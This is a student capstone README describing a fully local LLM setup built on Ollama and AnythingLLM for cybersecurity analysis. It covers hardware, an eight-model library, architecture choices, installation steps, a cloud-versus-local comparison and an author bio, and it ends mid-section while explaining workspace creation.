# Local AI Infrastructure for Federal Cybersecurity Operations

**William Edward Beckham III**
Fayetteville Technical Community College
Artificial Intelligence Fundamentals — CSC-113-0901 | Spring 2026
Instructor: Andrew Norris | Class Dates: January 12 – May 13, 2026

---

## Overview

This project documents the design, testing, and deployment of a fully local AI infrastructure built for sensitive cybersecurity analysis work. The goal was to create a production-ready system capable of running large language models entirely on local hardware — no cloud, no external API calls, no data leaving the machine.

The motivating problem is real: federal cybersecurity roles at installations like Fort Bragg regularly involve analyzing threat intelligence, malware samples, and network traffic that cannot be transmitted to commercial cloud AI services like ChatGPT or Gemini due to data sovereignty and classification requirements. This system closes that gap.

---

## Course Context

This project was developed as the final capstone for CSC-113-0901 Artificial Intelligence Fundamentals at Fayetteville Technical Community College, progressing through the course module structure from initial ideation to final AI Showcase presentation.

**Relevant course outcomes this project addresses:**

- *Understand the fundamentals of AI and ML, including their history and development* — documented through the origin story, model library rationale, and deployment architecture comparison
- *Learn general techniques to use generative AI tools across different areas of investigation* — demonstrated through task-specific model routing across threat intelligence, code review, red team analysis, and documentation workflows
- *Develop critical skills to evaluate and select suitable AI tools for specific tasks* — evidenced by the cloud vs. local comparative test (January 24, 2026) and the model selection process documented with Claude AI assistance
- *Develop a practical semester project using AI* — this infrastructure is a fully operational production deployment, not a theoretical proposal

**Module progression:**

| Module | Topic | How This Project Relates |
|---|---|---|
| Module 4 | Find Your Project | Local AI infrastructure selected as final project |
| Module 5 | Design Your Project | Architecture decisions and model selection documented |
| Module 6 | Project: Sprint 1 | Core deployment — Ollama native Windows installation, model library |
| Module 7 | Project: Sprint 2 | AnythingLLM integration, workspace configuration, system prompts |
| Module 8 | Project: The Payoff | AI Showcase — full documentation and live demonstration |

---



This project didn't start with a plan. In May 2025, I discovered Ollama while exploring what was possible with the hardware I already owned. I was curious whether I could run AI models locally, completely disconnected from cloud services. Within days of pulling my first model, I found I genuinely enjoyed it. What started as tinkering quickly became a serious side project.

By late May 2025, I had already downloaded and tested 18 different models — large general-purpose models, coding specialists, and domain-specific variants. The collection kept growing as I learned which models performed better for which tasks. Over the following months, through iterative testing across three different deployment architectures (native Windows, Docker, and WSL), I arrived at the current production setup documented here.

What started as personal curiosity evolved into directly applicable infrastructure for my target career path in federal cybersecurity. The connection became clear: federal analysts cannot send sensitive data to commercial AI APIs. A local AI setup that delivers strong analytical capability while maintaining complete data sovereignty is exactly what those environments need — and I had already built one.

---

## Hardware

### Core Architecture

| Component | Specification |
|---|---|
| CPU | AMD Ryzen 9 7900X @ 5.30GHz stable (±0.02 variance) — 12 Core / 24 Thread |
| Motherboard | ASUS ROG Crosshair X670E Hero (Rev 1.xx) |
| RAM | 64GB DDR5-5600 (air cooled) |
| GPU | Zotac RTX 4080 16GB VRAM (air cooled) |
| PSU | 850W+ certified |
| Case | Thermaltake Core P8 |
| OS | Windows 11 Pro (Build 26200.7623) |

### Cooling System

| Component | Specification |
|---|---|
| CPU Block | EKWB Velocity 2 (custom closed-loop) |
| Radiator | EKWB XE 360mm — 60mm thick |
| Pump | DDC with soft tubing configuration |

The cooling architecture is not incidental — sustained AI inference workloads push the CPU and GPU harder than typical desktop use. The custom loop on the Ryzen 9 7900X maintains thermal stability during long inference runs where lesser cooling would introduce thermal throttling and inconsistent token generation speeds.

### Why This Hardware

This system was not built for local AI. It was built as a high-end gaming and general-use workstation with future-proofing as the primary goal — invest once in hardware that stays relevant across multiple hardware generations rather than upgrading on a short cycle. The RTX 4080, 64GB DDR5, and Ryzen 9 7900X were selected with that philosophy in mind.

It just happens that those hardware choices work exceptionally well for local AI infrastructure.

When Ollama entered the picture in May 2025, no upgrades were needed. The system was already capable of running large models out of the box. The specs that make it a great long-term gaming rig — high VRAM, substantial system RAM, a strong multi-core CPU — are the same specs that matter for local model inference.

The RTX 4080's 16GB VRAM fits the 32B–33B model class that represents the best capability tradeoff for security analysis work. The 64GB of system RAM handles OS overhead, supporting applications, and offloading layers from models that exceed VRAM capacity. The Ryzen 9 7900X handles CPU-bound operations without bottlenecking the GPU. None of that was planned for AI — it was just good hardware that turned out to be the right hardware.

---

## Software Stack

| Layer | Tool | Version |
|---|---|---|
| Model runtime | Ollama | v0.14.0 |
| Chat interface | AnythingLLM | v1.8.4 |
| OS | Windows 11 Pro | Build 26200.7623 |

**Ollama** manages model downloads, versioning, and the local REST API that applications use to query models.

**AnythingLLM** sits on top of Ollama and provides the workspace interface — document ingestion, conversation history, multi-model switching, and RAG (retrieval-augmented generation) for querying against uploaded documents. This layer is critical for the threat intelligence correlation use case where analysts need to query AI against specific uploaded reports or CVE data.

---

## Model Library

Eight specialized models are deployed, each selected for specific analytical tasks. The library is the result of testing 18+ models and keeping what performed best per role.

| Model | Size | Primary Use |
|---|---|---|
| `qwen3:32b` | 20GB | Primary analysis and documentation — daily workhorse |
| `llama3.1:70b-instruct-q4_K_M` | 42GB | Advanced reasoning — quantized for VRAM fit |
| `deepseek-r1:32b` | 19GB | Specialized reasoning tasks, attack chain analysis |
| `deepseek-coder:33b-instruct` | 18GB | Programming, code analysis, vulnerability assessment |
| `qwen3-coder:30b` | 18GB | Code analysis, secure development support |
| `phi4-reasoning:14b` | 11GB | Logical reasoning, fast-response triage |
| `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` | 4.7GB | Security-specialized threat pattern recognition |
| `jimscard/blackhat-hacker:v2` | 9.2GB | Penetration testing perspective, red team analysis |

**Total deployed model storage: ~150GB**

### Model Selection Rationale

The current library did not arrive fully formed. It is the result of several months of research, testing, and deliberate pruning starting from a much larger experimental collection of 18+ models in May 2025. Claude AI was used throughout this process as a research tool — querying it to understand what each model class was designed for, what hardware constraints applied, and which models were worth prioritizing given the RTX 4080's 16GB VRAM ceiling.

A key constraint that shaped the final library came directly from that research process: **no model over ~42GB total size** — meaning everything had to fit within the combined VRAM + system RAM envelope without becoming unstable. Models that exceeded this were ruled out regardless of capability. The 70B Llama model is the single exception and runs with partial system RAM offload at reduced speed.

The following documents each model in the current library — what it is, why it was selected, and what role it fills that no other model in the library covers.

---

#### `qwen3:32b` — 20GB — Primary Analysis and Documentation

**What it is:** Qwen3 is Alibaba's third-generation large language model series. The 32B variant is the flagship of the mid-size range — strong general reasoning, excellent instruction following, and high-quality structured output generation.

**Why it was selected:** During model comparison testing in early 2025, Qwen3:32b consistently produced the best balance of output quality and response speed among the 30B–33B class models. At 3–5 tokens/second on the RTX 4080, it is fast enough for interactive use while producing analytical output that holds up against larger models on most tasks.

**Role in the library:** Daily workhorse. Default model for documentation, general analysis, drafting reports, summarizing documents, and any task that doesn't require a domain-specific specialist. When in doubt about which model to use, this is the one.

**Why nothing else covers this role:** The cybersecurity and coding specialists produce better output on their specific domains but are less reliable on general analytical tasks. The 70B model produces marginally better output on complex reasoning but at significantly higher latency. Qwen3:32b is the best general-purpose option that fits within practical speed constraints.

---

#### `llama3.1:70b-instruct-q4_K_M` — 42GB — Advanced Reasoning and Complex Analysis

**What it is:** Meta's Llama 3.1 at 70 billion parameters, quantized to 4-bit precision (Q4_K_M) to fit within the available hardware. At 70B parameters this is the largest model in the library and the most capable on complex multi-step reasoning tasks.

**Why it was selected:** Research conducted with Claude AI's assistance identified the 70B parameter class as the threshold where models demonstrate qualitatively better performance on tasks requiring sustained reasoning chains — threat campaign reconstruction, long document synthesis, and multi-factor analysis. Smaller models handle most tasks adequately, but for high-stakes analytical work where accuracy matters more than speed, the 70B model produces measurably better output.

The Q4_K_M quantization was specifically chosen as the best tradeoff between size and quality — it reduces the model from ~140GB at full precision to 42GB while preserving most of its reasoning capability.

**Role in the library:** Reserved for high-complexity tasks where depth matters more than latency — analyzing lengthy threat reports, reconstructing multi-stage attack campaigns, synthesizing information from multiple sources, and any task where a 32B model's output feels shallow or incomplete.

**Why nothing else covers this role:** No other model in the library approaches 70B parameters. The gap between 32B and 70B in reasoning quality is meaningful on complex tasks. This model exists specifically for when that extra capability is needed.

---

#### `deepseek-r1:32b` — 19GB — Specialized Reasoning and Attack Chain Analysis

**What it is:** DeepSeek R1 is a reasoning-specialized model from DeepSeek that was trained with reinforcement learning to produce explicit chain-of-thought reasoning. Unlike standard instruction-tuned models, R1 works through problems step by step before arriving at a conclusion — making its reasoning process visible and auditable.

**Why it was selected:** Claude AI recommended the DeepSeek R1 series specifically for tasks that require traceable multi-step logic — where you need to see *how* the model arrived at a conclusion, not just *what* it concluded. For cybersecurity work, this matters: when reconstructing an attack chain or assessing exploitation likelihood, the reasoning steps are as important as the final answer.

**Role in the library:** Attack chain reconstruction, threat impact assessment, and any analytical task where the reasoning process needs to be reviewed — not just the output. Also used for complex problem decomposition where breaking a task into explicit steps produces better results than prompting for a direct answer.

**Why nothing else covers this role:** Standard instruction-tuned models like Qwen3:32b produce answers directly without showing their work. R1's chain-of-thought design makes it fundamentally different in how it approaches problems — it fills a reasoning transparency role that no other model in the library provides.

---

#### `deepseek-coder:33b-instruct` — 18GB — Code Analysis and Vulnerability Assessment

**What it is:** DeepSeek Coder is a code-specialized model trained primarily on programming data across multiple languages. The 33B instruct variant is fine-tuned for instruction following in coding contexts — explaining code, writing code, reviewing code, and identifying problems in code.

**Why it was selected:** Early in the model selection process, testing showed that general-purpose models produced noticeably weaker results on code-specific tasks compared to models trained specifically on code. DeepSeek Coder:33b was identified — with Claude AI's guidance — as one of the strongest code-focused models available for local deployment at a size that fits within VRAM constraints. It handles multi-language code analysis and produces detailed explanations of vulnerabilities in a way that general models do not.

**Role in the library:** Code review, vulnerability identification, secure coding guidance, and analysis of malware or exploit code samples. Any task where the input is primarily code and the output needs to demonstrate genuine understanding of what the code does and what it risks.

**Why nothing else covers this role:** General models can read and discuss code but lack the depth of code-specific training. For serious vulnerability assessment work — the kind that matters in federal cybersecurity roles — a code-specialized model produces significantly better output.

---

#### `qwen3-coder:30b` — 18GB — Code Analysis and Secure Development Support

**What it is:** Qwen3 Coder is Alibaba's code-specialized variant of the Qwen3 model series, released in mid-2025. Like DeepSeek Coder, it is trained primarily on programming data, but it benefits from the Qwen3 architecture's improvements in instruction following and structured output.

**Why it was selected:** Added to the library after its release in summer 2025 based on recommendations from Claude AI that the Qwen3 Coder series represented a meaningful improvement over earlier code models at the same size class. Testing confirmed it performs well on code generation and review tasks, with particularly strong output on Python — directly relevant to the Python RPG project and security scripting work.

**Role in the library:** Complements DeepSeek Coder:33b. When one code model's output on a specific task seems incomplete or uncertain, running the same task through the other provides a second perspective. Also the preferred model for Python-specific work based on testing.

**Why it exists alongside DeepSeek Coder:** Having two strong code models enables cross-validation — a technique where the same piece of code is reviewed by both models and discrepancies are flagged for closer human review. In security work, a vulnerability missed by one model may be caught by another.

---

#### `phi4-reasoning:14b` — 11GB — Fast Reasoning and Rapid Triage

**What it is:** Phi-4 Reasoning is Microsoft's reasoning-specialized model in the Phi series, designed to deliver strong reasoning capability in a compact 14B parameter package. It was trained with techniques that prioritize logical reasoning performance at small model sizes.

**Why it was selected:** Claude AI identified the Phi-4 Reasoning model as the best option for situations where reasoning quality matters but response latency also matters — a middle ground between the fast-but-shallow small models and the slow-but-deep large models. At 11GB it loads quickly, fits entirely in VRAM, and responds faster than the 30B+ class models while producing more structured reasoning output than general 7B–14B models.

**Role in the library:** Rapid triage — quickly assessing whether a threat alert warrants deeper analysis, performing initial screening of code for obvious vulnerabilities, and any task where a fast reasoned response is more useful than a slow comprehensive one. Also useful as a "sanity check" model to quickly validate conclusions from larger models.

**Why nothing else covers this role:** The other reasoning models (R1:32b, 70B) are slow enough that using them for quick triage is inefficient. The cybersecurity specialist models are fast but domain-narrow. Phi4 fills the fast-reasoning gap that exists between the small general models and the large specialist ones.

---

#### `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` — 4.7GB — Threat Intelligence and Security Analysis

**What it is:** A purpose-built cybersecurity model fine-tuned specifically on threat intelligence data, CVE databases, attack pattern documentation, and security research literature. At 4.7GB it is the smallest model in the library but one of the most specialized.

**Why it was selected:** This model was one of the earliest additions to the library, identified during the May 2025 research phase when Claude AI specifically flagged purpose-trained cybersecurity models as producing qualitatively different output compared to general models asked cybersecurity questions. The ALIENTELLIGENCE model was recommended as the most accessible and well-regarded cybersecurity-specific model available through Ollama at that time.

Testing confirmed the recommendation — on threat intelligence prompts, this model produces output structured around threat actor TTPs, MITRE ATT&CK classifications, and operational security context in a way that general models do not replicate without extensive prompting.

**Role in the library:** Primary model for threat intelligence analysis, CVE assessment, CISA alert triage, and any task that requires interpreting security data through the lens of established threat frameworks. The Threat Intelligence workspace in AnythingLLM is configured exclusively around this model.

**Why nothing else covers this role:** General models can discuss threat intelligence but lack the domain-specific fine-tuning that makes responses operationally structured. The difference between a general model and this one on a threat intelligence task is the difference between a knowledgeable generalist and a trained analyst.

---

#### `jimscard/blackhat-hacker:v2` — 9.2GB — Red Team and Adversarial Perspective

**What it is:** A model fine-tuned to reason from an adversarial perspective — approaching systems, configurations, and scenarios the way an attacker would. Designed for red team analysis, penetration testing planning, and attack surface enumeration.

**Why it was selected:** Claude AI's guidance during the model selection process identified this as filling a role that no other model type covers — the explicit adversarial perspective. In cybersecurity, understanding how an attacker sees a system is as important as understanding how a defender sees it. General models tend to default to defensive framing even when asked for offensive analysis. This model is specifically trained to maintain the adversarial perspective consistently.

**Role in the library:** Red team exercises, attack surface analysis, penetration testing planning, and reviewing defensive configurations from an attacker's viewpoint. Any task where the question is "how would an attacker approach this?" rather than "how do we defend this?"

**Why nothing else covers this role:** The cybersecurity specialist model approaches security from a defensive and analytical posture. This model approaches it from an offensive posture. Both perspectives are necessary for complete security analysis — identifying what to defend requires understanding what will be attacked and how.

---

---

## Task Routing

A core design decision in this system is not using a single model for everything. Each analytical task is routed to the model best suited for it:

| Task Type | Model |
|---|---|
| Threat intelligence analysis | `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` |
| Code review / vulnerability assessment | `deepseek-coder:33b-instruct` |
| Red team / penetration testing perspective | `jimscard/blackhat-hacker:v2` |
| Attack chain reconstruction | `deepseek-r1:32b` |
| Long document analysis / complex reasoning | `llama3.1:70b-instruct-q4_K_M` |
| General analysis and documentation | `qwen3:32b` |

This approach mirrors how a real SOC team operates — different analysts with different specializations handle different problem types. The model library reflects that same division of responsibility.

---

## Deployment Architecture: Why Native Windows

Three deployment architectures were fully implemented and tested before committing to the production setup. This was not a theoretical comparison — each approach ran real analytical workloads on the same hardware.

### Architecture 1: Docker Desktop + ngrok (Tested, Rejected)

**What was tested:** Ollama running inside a Docker container, with ngrok providing external tunnel access for remote querying.

**Why it was rejected:**
- Container overhead measurably reduced inference speed — every token generation passed through an additional abstraction layer
- GPU passthrough in Docker Desktop on Windows adds configuration complexity and reduces VRAM utilization efficiency
- Deployment and maintenance overhead added friction without benefit for a single-user setup
- The ngrok dependency introduced an external network component that contradicts the air-gap design goal — data sovereignty requires zero external dependencies

### Architecture 2: WSL (Tested, Rejected)

**What was tested:** Ollama running inside a WSL2 Linux environment on the same hardware.

**Why it was rejected:**
- The WSL2 abstraction layer introduced latency compared to native execution on identical hardware
- Hardware resource utilization (VRAM, RAM) was less efficient than direct OS access
- GPU driver integration between WSL2 and the Windows NVIDIA driver stack introduced instability on sustained workloads
- Performance degraded noticeably on long inference runs compared to the native baseline

### Architecture 3: Native Windows Installation (Current Production)

**Why it works:**
- Direct hardware access — Ollama communicates with the RTX 4080 through native NVIDIA drivers with no virtualization layer
- Maximum VRAM utilization efficiency
- Simpler maintenance — no container lifecycle, no WSL environment to manage
- Stable, consistent performance on sustained analytical workloads
- Zero external network dependencies — complete air-gap capability

**The core lesson:** Containerization and virtualization solve real problems — portability, isolation, multi-tenancy. This use case doesn't have those problems. Accepting the overhead of those solutions without needing their benefits is a net performance loss. For a single-user, single-machine deployment optimized for maximum inference performance, native installation is the correct architecture.

---

## Installation: Native Windows Deployment

> This documents the production deployment path. Docker and WSL paths were tested and documented separately during the architecture evaluation phase.

### Prerequisites

- Windows 10/11 Pro (64-bit)
- NVIDIA GPU with current drivers (CUDA 11.8+ recommended)
- 16GB+ VRAM for the model sizes used here
- Sufficient disk space (~25–50GB per large model; 150GB+ for the full library)

---

## Part 1: Installing Ollama

### Step 1: Download the Ollama Installer

1. Open your browser and navigate to [ollama.com](https://ollama.com)
2. Click the **Download** button on the homepage
3. Select **Download for Windows**
4. Save the installer file (`OllamaSetup.exe`) to your Downloads folder

> 📸 **Screenshot needed:** Ollama.com homepage with the Download for Windows button visible

---

### Step 2: Run the Installer

1. Navigate to your Downloads folder
2. Double-click `OllamaSetup.exe`
3. If Windows Defender SmartScreen appears, click **More info** → **Run anyway**
4. The installer will run silently — no prompts or wizard screens
5. When complete, the Ollama icon will appear in your system tray (bottom right of taskbar)

> 📸 **Screenshot needed:** Windows taskbar system tray showing the Ollama icon after installation completes

---

### Step 3: Verify Ollama Installed Correctly

1. Press `Windows + R`, type `cmd`, press Enter to open Command Prompt
2. Type the following and press Enter:

```
ollama --version
```

3. You should see the version number returned (e.g., `ollama version 0.14.0`)

> 📸 **Screenshot needed:** Command Prompt window showing `ollama --version` command and the version output confirming 0.14.0

---

### Step 4: Verify Ollama Service is Running

Ollama installs as a background Windows service that starts automatically. Confirm it is active:

1. Press `Ctrl + Shift + Esc` to open Task Manager
2. Click the **Services** tab
3. Scroll to find **Ollama** in the list
4. Confirm the status column shows **Running**

Alternatively, in Command Prompt:

```
ollama serve
```

If the service is already running, this returns an address-in-use message — which confirms it is active.

> 📸 **Screenshot needed:** Task Manager → Services tab with Ollama service visible and status showing Running

---

### Step 5: Pull Your First Model

With Ollama running, download your first model. Start with the primary workhorse:

```
ollama pull qwen3:32b
```

Ollama will display a progress bar showing download status. The 20GB download will take several minutes to hours depending on connection speed.

> 📸 **Screenshot needed:** Command Prompt showing `ollama pull qwen3:32b` actively downloading with the progress bar, file size, and download speed visible

---

### Step 6: Confirm the Model Downloaded Successfully

When the download completes, verify it is in your library:

```
ollama list
```

You should see `qwen3:32b` listed with its size and the date it was pulled.

> 📸 **Screenshot needed:** Command Prompt showing `ollama list` output with `qwen3:32b` appearing in the model list with size and date

---

### Step 7: Run a Quick Test in the Terminal

Before setting up AnythingLLM, confirm the model works by running a direct query:

```
ollama run qwen3:32b "What is the MITRE ATT&CK framework?"
```

The model will load and begin generating a response token by token in the terminal.

> 📸 **Screenshot needed:** Command Prompt showing `ollama run qwen3:32b` with a response actively generating in the terminal window

---

### Step 8: Verify GPU is Being Used

While the model is running (or immediately after), check GPU utilization:

1. Press `Ctrl + Shift + Esc` to open Task Manager
2. Click **Performance** tab
3. Click **GPU** in the left panel
4. Confirm the **Dedicated GPU Memory** (VRAM) graph shows a spike during inference

> 📸 **Screenshot needed:** Task Manager → Performance → GPU panel showing VRAM utilization spike while the model is actively running inference

---

### Step 9: Pull the Remaining Models

Repeat the pull command for each model in the library. Run these one at a time — do not start the next pull until the current one completes:

```
ollama pull llama3.1:70b-instruct-q4_K_M
ollama pull deepseek-r1:32b
ollama pull deepseek-coder:33b-instruct
ollama pull qwen3-coder:30b
ollama pull phi4-reasoning:14b
ollama pull ALIENTELLIGENCE/cybersecuritythreatanalysisv2
ollama pull jimscard/blackhat-hacker:v2
```

> 📸 **Screenshot needed:** Command Prompt showing `ollama list` with all 8 models present after all pulls complete, displaying names, sizes, and dates

---

## Part 2: Installing AnythingLLM

### Step 1: Download the AnythingLLM Installer

1. Open your browser and navigate to [anythingllm.com/desktop](https://anythingllm.com/desktop)
2. Click **Download for Desktop**
3. Select the **Windows** installer
4. Save `AnythingLLMDesktop.exe` to your Downloads folder

> 📸 **Screenshot needed:** AnythingLLM.com download page with the Windows desktop installer option visible

---

### Step 2: Run the Installer

1. Navigate to your Downloads folder
2. Double-click `AnythingLLMDesktop.exe`
3. If prompted by Windows Defender SmartScreen, click **More info** → **Run anyway**
4. The installer wizard will open — click **Next** through the prompts
5. Accept the default install location or choose your preferred directory
6. Click **Install**
7. Click **Finish** when complete — AnythingLLM will launch automatically

> 📸 **Screenshot needed:** AnythingLLM installer wizard open showing the installation progress screen

---

### Step 3: Complete the First-Launch Setup Wizard

On first launch, AnythingLLM runs a setup wizard:

1. **Welcome screen** — click **Get Started**
2. **LLM Provider selection** — scroll the list and select **Ollama**
3. **Ollama Base URL** — enter:
   ```
   http://localhost:11434
   ```
4. **Model selection** — select `qwen3:32b` from the dropdown (your models should auto-populate)
5. Click **Next** through any remaining wizard screens
6. Click **Finish** or **Complete Setup**

> 📸 **Screenshot needed:** AnythingLLM first-launch wizard showing the LLM Provider selection screen with Ollama highlighted

> 📸 **Screenshot needed:** AnythingLLM wizard showing the Ollama Base URL field with `http://localhost:11434` entered and the model dropdown populated with your local models

---

### Step 4: Verify the Version

After setup completes:

1. Click the **gear icon** (bottom left of the sidebar)
2. Scroll to **About** or look for the version number at the bottom of the Settings panel
3. Confirm version **v1.8.4** or newer

> 📸 **Screenshot needed:** AnythingLLM Settings panel showing the version number confirming v1.8.4

---

### Step 5: Confirm Ollama Connection in Settings

1. In Settings, navigate to **AI Providers → LLM Provider**
2. Confirm **Ollama** is selected as the provider
3. Confirm the Base URL shows `http://localhost:11434`
4. Confirm the model dropdown shows your local models

> 📸 **Screenshot needed:** AnythingLLM Settings → AI Providers → LLM Provider screen showing Ollama selected, the localhost URL, and the model list populated

---

### Step 6: Create Your First Workspace

1. On the main screen, click **+ New Workspace** in the left sidebar
2. Type a name — start with `General`
3. Press Enter or click **Create**
4. The workspace opens and is ready for use

> 📸 **Screenshot needed:** AnythingLLM main screen showing the New Workspace creation prompt with a name being entered

---

### Step 7: Send a Test Message

In the General workspace:

1. Click in the message box at the bottom
2. Type: `Confirm you are running locally and identify your model name`
3. Press Enter
4. The model should respond confirming it is `qwen3:32b` running via Ollama

> 📸 **Screenshot needed:** AnythingLLM chat window showing the test message sent and a response from the model confirming local operation

---

### Step 8: Create the Remaining Workspaces

Repeat the workspace creation process for each analytical role:

1. Click **+ New Workspace**
2. Name it (e.g., `Threat Intelligence`)
3. Click the **settings icon** next to the workspace name
4. Go to **Chat Settings** → select the assigned model from the dropdown
5. Go to the **Prompt** tab → paste in the system prompt
6. Click **Save**

> 📸 **Screenshot needed:** AnythingLLM sidebar showing all workspaces created (General, Threat Intelligence, Code Review, Red Team, Attack Chain, Deep Analysis)

> 📸 **Screenshot needed:** Workspace settings panel open showing the Chat Settings tab with a model selected from the dropdown

> 📸 **Screenshot needed:** Workspace settings panel open showing the Prompt tab with a system prompt entered in the field

---



---

## Performance

Inference speeds vary significantly by model size. The figures below come from direct testing on the production hardware (RTX 4080 16GB) running Ollama v0.14.0 on Windows 11 Pro.

| Model | Size | Measured Speed | Notes |
|---|---|---|---|
| `qwen3:32b` | 20GB | 3–5 tokens/second | Confirmed benchmark — primary workhorse |
| `phi4-reasoning:14b` | 11GB | Faster than 32B | Smaller footprint, lower latency |
| `deepseek-coder:33b-instruct` | 18GB | Similar to qwen3:32b | Comparable size class |
| `deepseek-r1:32b` | 19GB | Similar to qwen3:32b | Comparable size class |
| `llama3.1:70b-instruct-q4_K_M` | 42GB | Slower than 32B class | Partial VRAM offload to system RAM |

The 3–5 tokens/second figure is specifically measured on `qwen3:32b`. Smaller models run faster; the 70B model runs slower due to partial offload beyond the 16GB VRAM ceiling. For analytical work — reading threat reports, drafting assessments, reviewing code — these speeds are operationally acceptable. A 4-minute response from a local model analyzing a full threat report is significantly faster than a human analyst doing the same work manually, and the data never left the machine.

All inference stays fully local. No query data leaves the machine under any circumstances.

---

## Cloud vs. Local AI: Comparative Test Results

**Test Date:** January 24, 2026

To validate the local infrastructure against commercial cloud alternatives, four tools were tested head-to-head across identical prompts. This comparison directly informed the tool selection strategy used in this deployment.

### Tools Tested

| Tool | Type | Data Handling |
|---|---|---|
| Gemini 2.5 Flash | Cloud (Google) | Queries transmitted to and processed by Google servers |
| Claude 3.5 | Cloud (Anthropic) — Free Tier | Data processed by Anthropic |
| ChatGPT 3.5 | Cloud (OpenAI) — Free Tier | Data stored by OpenAI, potential training data use |
| Qwen3:32B via Ollama | Local | Zero external transmission — complete air-gap |

### Test Results

| Prompt | Tool | Response Time | Quality (1–5) | Notes |
|---|---|---|---|---|
| Simple explanation | Gemini | 2s | 5 | Clear, structured. Data sent to Google. |
| | Claude | 3s | 4 | Good quality. Data processed by Anthropic. |
| | ChatGPT | 2.5s | 5 | Excellent balance. Data stored by OpenAI. |
| | **Qwen3:32B** | 2m 15s | 5 | High quality. **Zero data transmission.** |
| Haiku | Gemini | 2s | 4 | Creative. Query logged by Google. |
| | Claude | 2.5s | 5 | Vivid, emotionally engaging. Anthropic retention. |
| | ChatGPT | 2s | 5 | Poetic and concise. OpenAI training data potential. |
| | **Qwen3:32B** | 1m 45s | 4 | Creative. No external data exposure. |
| Table (ML vs. Programming) | Gemini | 3s | 5 | Perfect structure. Corporate data mining risk. |
| | Claude | 4s | 4 | Minor formatting issues. Third-party processing. |
| | ChatGPT | 3s | 4 | Accurate formatting. Data retention concerns. |
| | **Qwen3:32B** | 3m 20s | 5 | Excellent output. Air-gapped security. |
| GitHub learning plan | Gemini | 5s | 5 | Comprehensive. Google analytics tracking. |
| | ChatGPT | 5s | 5 | College-focused approach. OpenAI data policies apply. |
| | Claude | 6s | 4 | Basic plan. Anthropic terms of service. |
| | **Qwen3:32B** | 4m 45s | 5 | Detailed cybersecurity focus. Complete data control. |

### Key Findings

**Cloud tools:** 2–6 second response times across all tests. Output quality competitive with local models on general tasks. Critical limitation — every query is transmitted to, processed by, and potentially retained by a private corporation subject to government data requests. Zero data sovereignty.

**Local Qwen3:32B:** 1m 45s to 4m 45s response times depending on task complexity. Output quality matched or exceeded cloud tools on every structured analytical task (tables, plans, detailed explanations). Complete data sovereignty — no transmission, no retention, no third-party access.

### Tool Selection Strategy Derived from Testing

**Primary use — local Ollama deployment:**
- Any query involving sensitive data, internal system details, or security analysis
- All threat intelligence work, code review, and red team analysis
- Any task where data sovereignty is non-negotiable

**Limited cloud use acceptable:**
- Public research using already-public information
- Speed-critical formatting of non-sensitive content

**Operational rule:** Assume any cloud query could be retained, analyzed, or subpoenaed. When in doubt, run it locally.

---



The federal cybersecurity environment has a fundamental constraint that commercial AI tools cannot address: classified and sensitive data cannot leave controlled systems. Cloud-based AI services — regardless of their capability — are not usable for the analytical work that matters most in those environments.

This infrastructure directly addresses that constraint. Every capability available here — threat intelligence analysis, code vulnerability assessment, red team perspective generation, attack chain reconstruction — operates with complete data sovereignty. Asset inventory data, network traffic captures, and malware samples stay on the local machine.

This is the type of infrastructure that federal SOC environments need but typically lack the internal deployment knowledge to build. This project demonstrates both the technical capability to build it and the operational security reasoning behind every design choice.

---

## Project Timeline

| Period | Milestone |
|---|---|
| May 2025 | Discovered Ollama, pulled first models out of curiosity |
| May 2025 | Library grew to 18+ models through exploratory testing |
| Summer 2025 | Tested Docker Desktop + ngrok architecture — evaluated and rejected |
| Summer 2025 | Tested WSL deployment architecture — evaluated and rejected |
| Fall 2025 | Settled on native Windows as production architecture |
| Fall 2025 | Integrated AnythingLLM v1.8.4 as workspace interface layer |
| January 2026 | Current production library — 150GB, task-routed model collection |
| May 2026 | Graduating FTCC — targeting GS-11/12 federal cybersecurity positions |

---

## About the Author

U.S. Army veteran (13B Field Artillery, 38B Civil Affairs) with two combat deployments to Afghanistan and eight years of residency in Okinawa, Japan. Currently completing a Systems Security & Analysis degree at Fayetteville Technical Community College with a 4.0 GPA and President's List recognition every semester. Former AI Data Analyst on the DoD Pathfinder Project (2024–2025). Preparing for CompTIA Security+ and CySA+ certification.

- GitHub: [BECKHAMW3233/CSC-113](https://github.com/BECKHAMW3233/CSC-113)
- LinkedIn: [linkedin.com/in/WilliamBeckham](https://www.linkedin.com/in/WilliamBeckham/)

---

## AnythingLLM: Full Setup and Configuration

AnythingLLM is the workspace interface layer that sits on top of Ollama. While Ollama handles the model runtime and inference, AnythingLLM provides everything above that — workspaces, document ingestion, conversation history, system prompt management, and per-workspace model assignment. This section documents the full configuration used in this project.

---

### Step 1: Install AnythingLLM

Download the desktop installer from [anythingllm.com](https://anythingllm.com). Run the installer — it installs as a standard Windows desktop application. When you first launch AnythingLLM, it will run an initial setup wizard.

Verify your version after install:

- Open AnythingLLM
- Click the gear icon (bottom left) → **About**
- Confirm version is **v1.8.4** or newer

> 📸 **Screenshot needed:** AnythingLLM About screen showing version v1.8.4

---

### Step 2: Connect Ollama as the LLM Provider

AnythingLLM supports many LLM backends (OpenAI, Anthropic, Gemini, etc.). For local deployment, you configure it to point at your local Ollama instance.

1. Open AnythingLLM
2. Click the **gear icon** (bottom left) to open Settings
3. Navigate to **AI Providers → LLM Provider**
4. From the provider dropdown, select **Ollama**
5. In the **Ollama Base URL** field, enter:
   ```
   http://localhost:11434
   ```
6. Click **Save**

AnythingLLM will connect to your local Ollama instance and automatically populate the model list with every model you have pulled. If you don't see your models, verify Ollama is running (`ollama list` in a terminal confirms the service is active).

> 📸 **Screenshot needed:** AnythingLLM Settings → AI Providers → LLM Provider screen showing Ollama selected as provider with `http://localhost:11434` entered in the Base URL field

---

### Step 3: Set the Default Model

After connecting Ollama, you assign a default model at the system level. This is the model AnythingLLM falls back to for any workspace that doesn't have a specific model override.

1. In Settings → **AI Providers → LLM Provider** (same screen as above)
2. Under **Model Selection**, choose your primary model from the dropdown
3. For this deployment, the default is set to `qwen3:32b` — the daily-use workhorse
4. Click **Save**

> 📸 **Screenshot needed:** AnythingLLM model selection dropdown open showing the full list of available Ollama models with `qwen3:32b` selected

---

### Step 4: Create Workspaces

Workspaces are AnythingLLM's core organizational unit. Each workspace is an isolated environment with its own:

- Assigned AI model
- System prompt
- Document library (for RAG)
- Conversation history

This is what enables the task-routing strategy — rather than manually switching models for each query, you open the workspace designed for that task and the right model and prompt are already configured.

**To create a workspace:**

